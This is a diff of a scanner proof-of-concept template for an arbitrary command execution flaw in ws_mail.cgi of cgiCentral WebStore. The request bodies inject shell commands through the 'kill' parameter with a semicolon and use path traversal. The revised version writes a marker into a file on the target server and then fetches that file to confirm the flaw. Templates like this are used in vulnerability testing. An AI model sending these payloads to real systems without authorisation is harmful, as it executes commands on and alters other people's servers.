@@ -1,19 +1,11 @@
 [info]
-author = "AVE"
-description = "检测 cgiCentral WebStore 400/400CS 4.14 中 ws_mail.cgi 的任意命令执行漏洞。通过向 kill 参数注入 shell 元字符，验证服务器是否执行了攻击者控制的命令。"
+author = "ave"
+description = "AVE-2001-0536 verification"
 id = "POC-AVE-2001-0536"
-name = "cgiCentral WebStore 400 ws_mail.cgi Arbitrary Command Execution PoC"
-severity = "high"
-tags = [
-    "cve-2001-1343",
-    "webstore",
-    "rce",
-    "cgi",
-]
-vuln_id = [
-    "CVE-2001-1343",
-    "AVE-2001-0536",
-]
+name = "PoC for AVE-2001-0536"
+severity = "medium"
+tags = ["ave-2001-0536"]
+vuln_id = ["AVE-2001-0536"]
 
 [poc]
 logic = "any"
@@ -24,14 +16,22 @@ path = "/{{BaseURL}}/cgi-bin/ws_mail.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "userfile=../../Statistics/WebStore_Access.counter&kill=55555;echo+AVE_TEST&terminate=whatever&admin=yep&restart=pls&msgfile=../../Statistics/WebStore_Access.counter"
-type = "raw"
+content = "userfile=..%2FStatistics%2FWebStore_Access.counter&kill=55555%3Becho+VULNERABLE+%3E+..%2FStatistics%2FWebStore_Access.counter&terminate=whatever&admin=yep&restart=pls&msgfile=..%2F..%2FStatistics%2FWebStore_Access.counter"
+type = "form"
 
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/Statistics/WebStore_Access.counter"
+protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["AVE_TEST"]
+words = ["VULNERABLE"]
